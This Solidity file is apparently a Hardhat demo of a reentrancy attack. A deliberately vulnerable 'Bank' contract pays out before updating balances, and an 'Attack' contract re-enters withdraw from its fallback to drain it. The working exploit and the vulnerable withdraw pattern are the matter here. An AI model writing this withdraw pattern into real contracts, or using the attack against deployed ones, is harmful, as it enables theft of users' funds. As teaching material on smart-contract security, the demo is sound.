// SPDX-License-Identifier: GPL-3.0

//pragma solidity >=0.7.0 <0.9.0;
pragma solidity 0.6.10;

import "hardhat/console.sol";

contract Bank {

    mapping(address => uint256) public balances;
    
    function deposit() external payable {
        console.log("Deposited ", msg.value);
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 _val) external {
        console.log("Withdrawal by ", msg.sender);
        require(balances[msg.sender] >= _val, "not enough balance");
        (bool result, bytes memory data) = msg.sender.call{value:_val}("");
        require(result, string(data));
        //Does not happen if latest solidity compiler is used 0.8
        //Since arithmetic underflow is caught
        balances[msg.sender] -= _val;
        console.log("bank : ", balances[msg.sender] );
    }

    function balance() external view returns(uint256) {
        console.log("Balance is ", address(this).balance);
        return address(this).balance;
    }
}

contract Attack {
    Bank bank;
    constructor(address _bank) public payable {
        bank = Bank(_bank);
    }

    function attack() external{
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    fallback() external payable {
        uint256 balance = address(bank).balance / 10**18;
        console.log("Fallback start", balance);
        if(address(bank).balance >= 8 ether) {
            console.log("Fallback if ");
            bank.withdraw(1 ether);
        }
        console.log("Fallback end", balance);
    }
    
    function balance() external view returns(uint256) {
        console.log("Attack Balance is ", address(this).balance);
        return address(this).balance / 10**18;
    }
}

contract user {
    Bank bank;
    constructor(address _bank) public payable {
        bank = Bank(_bank);
    }

    function deposit() external {
        bank.deposit{value: 10 ether}();
    }
}
